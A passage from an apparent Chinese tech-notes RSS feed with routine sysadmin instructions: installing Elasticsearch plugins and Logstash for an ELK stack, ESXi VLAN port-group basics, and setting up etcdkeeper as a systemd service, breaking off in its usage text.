class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装插件1</h3>
<p>elk-node1/node2都安装</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装Elasticsearch插件</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# /usr/share/elasticsearch/bin/plugin install mobz/elasticsearch-head</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">测试</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http://20.0.0.10:9200/_plugin/head/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>elasticsearch集群部署</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# vi /etc/elasticsearch/elasticsearch.yml</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">69行</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 单播列表自动发现机制</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">discovery.zen.ping.unicast.hosts:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"20.0.0.10"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"20.0.0.20"]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">重启服务</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 yum.repos.d]# systemctl restart elasticsearch.service</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">测试</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">http://20.0.0.10:9200/_plugin/head/</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>安装插件2</h3>
<p>安装监控组件</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 elasticsearch]# /usr/share/elasticsearch/bin/plugin install lmenezes/elasticsearch-kopf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chown</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -R</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> elasticsearch:elasticsearch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/share/elasticsearch/plugins</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>两台服务器均可插件测试</h3>
<p></p>
<p></p>
<p></p>
<p></p>
<h2>Logstash</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Apache</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装httpd并开启服务</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 elasticsearch]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 elasticsearch]# vi /etc/yum.repos.d/logstash.repo</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[logstash-2.1]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">Logstash</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> repository</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2.1.x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> packages</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">baseurl</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://packages.elastic.co/logstash/2.1/centos</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgcheck</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">gpgkey</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">http://packages.elastic.co/GPG-KEY-elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">enable</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装Logstash</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@node1 elasticsearch]# yum install logstash -y</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">安装java环境，没有自带安装使用yum</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -y</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> java安装</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache ~]# yum -y install java</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache ~]# java -version</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openjdk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "1.8.0_131"</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Environment</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">1.8.0_131-b12</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 64-Bit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> VM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">25.131-b12,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mixed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]# ln -s /opt/logstash/bin/logstash /usr/local/bin/</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logstash（apache）与elasticsearch（node）功能是否正常，做对接测试</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]# logstash -e </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'input { stdin{} } output { stdout{} }'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Settings:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> workers:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Logstash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> startup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> completed</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">www.baidu.com</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">                       </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-18T07:53:59.480Z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apache</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> www.baidu.com</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>logstash命令选项解释：</p>
<pre><code>-f：指定logstash的配置文件，根据配置文件配置logstash
-e：后面跟着字符串，该字符串可以被当做logstash的配置（如果是“ ”，则默认使用stdin做输入，stdout为输出）
-t：测试配置文件是否正确，然后退出
#输入采用标准输入，输出采用标准输出
</code></pre>
<p>使用rubydebug显示详细输出</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]# logstash -e </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'input { stdin{} } output { stdout{ codec =&gt; rubydebug } }'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Settings:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> workers:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Logstash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> startup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> completed</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">www.baidu.com</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       "message"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"www.baidu.com",</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      "@version"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"1",</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    "@timestamp"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"2020-11-18T08:40:57.598Z",</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">          "host"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> =&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"apache"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">使用logstash将信息输出给elasticsearch</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]# logstash -e </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'input { stdin{} } output { elasticsearch { hosts =&gt; ["20.0.0.10:9200"] } }'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Settings:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Default</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> workers:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Logstash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> startup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> completed</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">abc123</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">      #输入内容</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tom456</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">123jerry</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在logstash收集系统日志</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">logstash配置文件主要由三部分组成：input、output、filter</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]# chmod o+r /var/log/messages   </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#允许其他用户访问</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@apache bin]#  ll /var/log/messages</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>ESXI中的网络</title>
      <link>https://www.geekery.cn/note-book/Esxi/ESXI%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C.html</link>
      <guid>https://www.geekery.cn/note-book/Esxi/ESXI%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C.html</guid>
      <source url="https://www.geekery.cn/rss.xml">ESXI中的网络</source>
      <description>ESXI中的网络 VLAN常识： vlan的范围: 一共有4096个vlan,vlan 1为默认vlan. 但其中vlan 0 和 vlan 4095是保留的,故用户真正可以创建的vlan数为4094。 vlan 0：不携带VLAN ID vlan 4095：保留的；在北电交换机中，CPU内部使用VLAN 4095来表示无效的VLAN ESXI的网络配...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h3>VLAN常识：</h3>
<p>vlan的范围: 一共有4096个vlan,vlan 1为默认vlan.
但其中vlan 0 和 vlan 4095是保留的,故用户真正可以创建的vlan数为4094。
vlan 0：不携带VLAN ID
vlan 4095：保留的；在北电交换机中，CPU内部使用VLAN 4095来表示无效的VLAN</p>
<h3>ESXI的网络配置：</h3>
<p><strong>虚拟交换机</strong> &gt;&gt;绑定&gt;&gt; 物理网卡
<strong>端口组</strong> &gt;&gt;绑定&gt;&gt; 虚拟交换机
<strong>虚拟机的网卡</strong> &gt;&gt;绑定&gt;&gt; 端口组</p>
<p>ESXI中，端口组是设置vlan标签的地方，默认0。
网络端口组设置，添加端口组， id设为4095（相当于交换机的trunk模式，允许所有的vlan通过）</p>
]]></content:encoded>
    </item>
    <item>
      <title>etcd安装etcdkeeper</title>
      <link>https://www.geekery.cn/note-book/Etcd/etcd%E5%AE%89%E8%A3%85etcdkeeper.html</link>
      <guid>https://www.geekery.cn/note-book/Etcd/etcd%E5%AE%89%E8%A3%85etcdkeeper.html</guid>
      <source url="https://www.geekery.cn/rss.xml">etcd安装etcdkeeper</source>
      <description>etcd安装etcdkeeper 安装etcd keeper github地址：https://github.com/evildecay/etcdkeeper 安装简单，步骤简短。 获取安装包 解压安装包 编辑systemd文件 启动参数 访问测试 http://YOUR_IP_ADDRESS:8888/etcdkeeper/ etcdkeeper访问...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>安装etcd keeper</h2>
<p>github地址：<a href="https://github.com/evildecay/etcdkeeper" target="_blank" rel="noopener noreferrer">https://github.com/evildecay/etcdkeeper</a></p>
<p>安装简单，步骤简短。</p>
<h2>获取安装包</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">wget</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/evildecay/etcdkeeper/releases/download/v0.7.6/etcdkeeper-v0.7.6-linux_x86_64.zip</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>解压安装包</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">unzip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcdkeeper-v0.7.6-linux_x86_64.zip</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mv</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcdkeeper</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /usr/local/etcdkeeper</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> +x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcdkeeper</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>编辑systemd文件</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /lib/systemd/system</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcdkeeper.service</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[Unit]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">Description</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">etcdkeeper</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> service</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">After</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">network.target</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[Service]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">Type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">simple</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ExecStart</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/usr/local/etcdkeeper/etcdkeeper</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> -h</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0.0.0.0</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8888</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">ExecReload</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/bin/kill</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> -HUP</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $MAINPID</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">KillMode</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">process</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">Restart</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">on-failure</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">PrivateTmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[Install]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">WantedBy</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">multi-user.target</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>启动参数</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Usage</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcdkeeper.exe:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -h</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (default: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"0.0.0.0",</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> addreess,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> not</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> etcd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> address</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        port</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (default </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">8080</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -sep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Separator</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (default </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -usetls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tls</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (only </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">v3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -cacert</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span></span>
